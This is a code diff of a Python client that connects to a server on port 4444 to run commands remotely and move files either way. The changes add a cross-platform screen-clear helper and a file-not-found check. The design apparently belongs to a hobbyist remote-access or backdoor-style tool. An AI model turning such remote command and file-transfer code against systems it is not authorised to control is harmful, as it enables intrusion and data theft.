@@ -6,7 +6,7 @@ class Client:
 		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		option = self.get_arguments()
 		self.connection.connect((option.server_ip, 4444))
-		os.system("clear")
+		self.clearShell()
 
 	def get_arguments(self):
 		parser = argparse.ArgumentParser()
@@ -49,10 +49,14 @@ class Client:
 		with open(path,"w") as file:
 			file.write(content)
 			return "[+] File {}  succesfully downloaded !".format(path)
+
         
 	def upload_file(self, path):
 		with open(path, "r") as file:
 			return str(file.read())	
+
+	def clearShell(self):
+		os.system('cls||clear')
         
 	def execute_on_server(self, command):
 		self.send_to_server(command)
@@ -74,8 +78,11 @@ class Client:
 					result = self.execute_on_server(new_command)
 					if command =="7":
 						file_content = self.upload_file(new_command)
-						self.send_to_server(file_content)
-						result = "[+] File {} succesfully uploaded to Server ! ".format(new_command)
+						if (file_content):
+							self.send_to_server(file_content)
+							result = self.receive_from_server()
+						else:
+							result = "[-] File not found !"
 					if command == "6":
 						result = self.download_file(new_command, result)
 			except Exception:
@@ -86,6 +93,6 @@ try:
 	client = Client()
 	client.run()
 except Exception: #per non mostrare messagio di errore se non ce un server
-    os.system("clear")
+    client.clearShell()
     print("[-] Error: No Server found!")
     sys.exit()
